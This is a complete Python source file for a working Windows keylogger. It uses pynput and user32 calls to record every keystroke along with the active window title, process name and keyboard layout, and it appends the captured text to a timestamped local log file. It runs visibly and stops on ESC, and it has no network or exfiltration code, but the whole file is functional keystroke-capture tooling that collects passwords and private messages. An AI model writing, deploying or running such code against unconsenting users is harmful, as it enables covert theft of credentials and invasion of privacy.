from pynput import keyboard
import psutil
import time
import platform
import subprocess
import datetime
from ctypes import windll, create_string_buffer, byref, c_ulong

class KeyLogger:
    def __init__(self):
        self.current_window = None
        self.current_process = None
        self.current_layout = None
        self.log = ""  # Initialize the log variable
        self.filename = f"keylogger_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}_Windows.txt"

    def get_current_process(self):
        # Get the handle of the current active window
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = pid.value

        try:
            # Get process details
            process = psutil.Process(process_id)
            process_name = process.name()
            window_title = create_string_buffer(512)
            windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

            # Decode the window title
            try:
                window_title = window_title.value.decode('utf-8')
            except UnicodeDecodeError:
                try:
                    window_title = window_title.value.decode('cp1252')
                except UnicodeDecodeError:
                    window_title = window_title.value.decode('latin-1', errors='ignore')

            # Check if the process or keyboard layout has changed
            if process_name != self.current_process or self.get_current_keyboard_layout() != self.current_layout:
                if self.current_process is not None and self.log:
                    self.save_log(self.current_process, self.log)
                    self.log = ""

                # Update current process details
                self.current_process = process_name
                self.current_window = window_title
                self.current_layout = self.get_current_keyboard_layout()
                print(f"\n[INFO] Active window: {self.current_window} | Process: {self.current_process} (PID: {process_id}) | Layout: {self.current_layout}", flush=True)

        except Exception as e:
            print(f"\n[ERROR] Could not retrieve process information: {e}", flush=True)

    def get_language_name(self, language_id):
        # Map common language IDs to language names
        languages = {
            0x0409: "English (US)",
            0x0419: "Russian",
            0x0407: "German",
            0x040C: "French",
            0x0410: "Italian",
            0x0416: "Portuguese (Brazil)",
        }
        return languages.get(language_id, f"Unknown (ID: {hex(language_id)})")

    def get_current_keyboard_layout(self):
        # Get the current keyboard layout for the active window
        hwnd = windll.user32.GetForegroundWindow()
        thread_id = windll.user32.GetWindowThreadProcessId(hwnd, None)
        layout_id = windll.user32.GetKeyboardLayout(thread_id)
        language_id = layout_id & 0xFFFF
        return self.get_language_name(language_id)

    def on_key_press(self, key):
        # Retrieve process information when a key is pressed
        self.get_current_process()

        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += ' '
            elif key == keyboard.Key.enter:
                self.log += '\n'
            else:
                self.log += f'[{key.name}]'

    def on_key_release(self, key):
        # Stop keylogger if ESC key is pressed
        if key == keyboard.Key.esc:
            if self.log:
                self.save_log(self.current_process, self.log)
            print("\n[INFO] Keylogger stopped.")
            return False

    def save_log(self, process_name, log_content):
        # Save the log content to a file
        with open(self.filename, 'a', encoding='utf-8') as log_file:
            log_file.write(f"[{datetime.datetime.now()}] Process: {process_name if process_name else 'Unknown'} | Layout: {self.current_layout}\n")
            log_file.write(log_content + "\n")
            log_file.write("="*50 + "\n")

    def start(self):
        # Start listening for keyboard events
        with keyboard.Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger()
    print("[INFO] Keylogger started. Press ESC to stop.")
    keylogger.start()
